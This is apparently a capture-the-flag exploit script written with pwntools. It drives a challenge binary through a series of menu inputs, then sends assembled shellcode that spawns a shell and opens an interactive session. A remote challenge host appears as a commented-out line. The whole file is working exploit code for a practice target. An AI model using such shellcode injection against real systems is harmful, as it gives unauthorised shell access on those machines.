from pwn import *
context.arch = "amd64"

io = process("./chal")
# io = remote("amt.rs", 31172)

io.sendlineafter(b"> ", b"0")
io.sendlineafter(b"> ", b"4096")
io.sendlineafter(b"> ", b"0")
io.sendlineafter(b"> ", b"456")
io.sendlineafter(b"> ", b"0")
io.sendlineafter(b"> ", b"7")

payload = asm(shellcraft.sh())
io.sendline(payload)

io.sendlineafter(b"> ", b"0")

io.interactive()